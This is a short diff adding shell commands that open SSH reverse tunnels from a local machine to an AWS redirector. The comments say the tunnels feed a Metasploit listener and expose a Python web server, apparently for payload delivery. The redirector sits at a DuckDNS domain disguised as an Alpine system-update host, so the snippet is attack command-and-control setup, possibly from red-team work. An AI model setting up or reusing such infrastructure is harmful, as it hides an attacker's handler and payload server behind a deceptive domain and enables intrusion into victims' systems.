@@ -1,0 +1,5 @@
+# -R 9000 connects AWS to Metasploit listener
+# -R 8080 exposes Python web server to redirector
+ssh -i aws_redirector_key_pair.pem -N -R 9000:127.0.0.1:8888 -R 8080:127.0.0.1:8000 ubuntu@ns-alpine-sys-update.duckdns.org
+
+ssh -i aws_redirector_key_pair.pem -N -R 9000:127.0.0.1:8888 ubuntu@ns-alpine-sys-update.duckdns.org
